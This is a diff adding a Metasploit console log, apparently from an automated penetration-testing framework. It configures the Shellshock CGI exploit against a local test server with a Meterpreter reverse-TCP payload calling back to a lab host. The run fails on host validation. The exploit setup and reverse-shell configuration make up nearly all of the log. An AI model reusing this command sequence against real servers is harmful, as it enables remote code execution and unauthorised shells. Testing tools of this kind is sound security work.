@@ -1,0 +1,19 @@
+[1m[34m[*][0m Processing modules/drivers/exploitation/msf_scripts/127_0_0_1_3000_shellshock.rc for ERB directives.
+resource (modules/drivers/exploitation/msf_scripts/127_0_0_1_3000_shellshock.rc)> use exploit/multi/http/apache_mod_cgi_bash_env_exec
+[0m[1m[34m[*][0m No payload configured, defaulting to linux/x86/meterpreter/reverse_tcp
+resource (modules/drivers/exploitation/msf_scripts/127_0_0_1_3000_shellshock.rc)> set RHOSTS 127.0.0.1:3000
+[0mRHOSTS => 127.0.0.1:3000
+resource (modules/drivers/exploitation/msf_scripts/127_0_0_1_3000_shellshock.rc)> set RPORT 8080
+[0mRPORT => 8080
+resource (modules/drivers/exploitation/msf_scripts/127_0_0_1_3000_shellshock.rc)> set LHOST 192.168.56.102
+[0mLHOST => 192.168.56.102
+resource (modules/drivers/exploitation/msf_scripts/127_0_0_1_3000_shellshock.rc)> set TARGETURI /cgi-bin/test.cgi
+[0mTARGETURI => /cgi-bin/test.cgi
+resource (modules/drivers/exploitation/msf_scripts/127_0_0_1_3000_shellshock.rc)> set ExitOnSession true
+[0m[1m[33m[!][0m Unknown datastore option: ExitOnSession.
+ExitOnSession => true
+resource (modules/drivers/exploitation/msf_scripts/127_0_0_1_3000_shellshock.rc)> run
+[0m[1m[31m[-][0m Msf::OptionValidateError The following options failed to validate:
+[1m[31m[-][0m Invalid option RHOSTS: Host resolution failed: 127.0.0.1:3000
+resource (modules/drivers/exploitation/msf_scripts/127_0_0_1_3000_shellshock.rc)> exit
+[0m
